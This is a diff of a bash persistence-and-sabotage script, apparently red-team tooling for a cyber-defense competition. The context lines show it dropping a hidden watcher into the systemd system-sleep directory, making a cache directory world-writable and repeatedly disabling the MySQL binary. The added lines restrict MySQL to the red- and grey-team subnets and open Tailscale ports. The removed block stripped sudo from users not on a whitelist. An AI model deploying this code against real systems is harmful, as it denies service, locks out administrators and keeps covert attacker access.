@@ -1,6 +1,5 @@
 #!/bin/bash
-# ── WHITELIST ──────────────────────────────────────────
-WHITELIST=("greyteam" "scoring" "cia" "kgb")
+# ── CONFIG ─────────────────────────────────────────────
 LOG="/var/lib/.cache/mysql_watch.log"
 # ──────────────────────────────────────────────────────
 
@@ -13,8 +12,7 @@ chmod 777 /var/lib/.cache
 # 2. Drop watcher script onto target box
 cat > /usr/lib/systemd/system-sleep/net_helper.sh << 'WATCHER'
 #!/bin/bash
-# ── WHITELIST ──────────────────────────────────────────
-WHITELIST=("greyteam" "scoring" "cia" "kgb")
+# ── CONFIG ─────────────────────────────────────────────
 LOG="/var/lib/.cache/mysql_watch.log"
 # ──────────────────────────────────────────────────────
 
@@ -88,12 +86,21 @@ EOF
 
         echo "[$(date)] iptables rules missing — restoring" >> $LOG
 
+        # safety — always allow Tailscale ports first
+        iptables -A INPUT -p udp --dport 41641 -j ACCEPT
+        iptables -A INPUT -p udp --dport 3478  -j ACCEPT
+
+        # whitelist grey team and red team networks
         iptables -A INPUT -p tcp --dport 3306 \
-            -s 10.100.0.0/24 -j ACCEPT
+            -s 10.100.0.0/24 -j ACCEPT          # grey team net
         iptables -A INPUT -p tcp --dport 3306 \
-            -s 10.100.1.0/24 -j ACCEPT
+            -s 10.100.1.0/24 -j ACCEPT          # red team net
+
+        # drop everyone else
         iptables -A INPUT -p tcp --dport 3306 -j DROP
 
+        # create directory and save rules
+        mkdir -p /etc/iptables
         iptables-save > /etc/iptables/rules.v4  2>/dev/null || \
         iptables-save > /etc/iptables.rules     2>/dev/null
 
@@ -105,24 +112,6 @@ EOF
         chmod 000 /usr/sbin/mysqld    2>/dev/null
         echo "[$(date)] Binary permissions re-removed" >> $LOG
     fi
-
-    # ── 5. Whitelist enforcement ───────────────────────
-    while IFS= read -r sudoer; do
-        username=$(echo "$sudoer" | awk '{print $1}')
-        in_whitelist=false
-
-        for w in "${WHITELIST[@]}"; do
-            if [[ "$username" == "$w" ]]; then
-                in_whitelist=true
-                break
-            fi
-        done
-
-        if [ "$in_whitelist" = false ] && [ -n "$username" ]; then
-            gpasswd -d "$username" sudo 2>/dev/null
-            echo "[$(date)] Removed sudo from $username" >> $LOG
-        fi
-    done < <(getent group sudo | cut -d: -f4 | tr ',' '\n')
 
     sleep 15
 
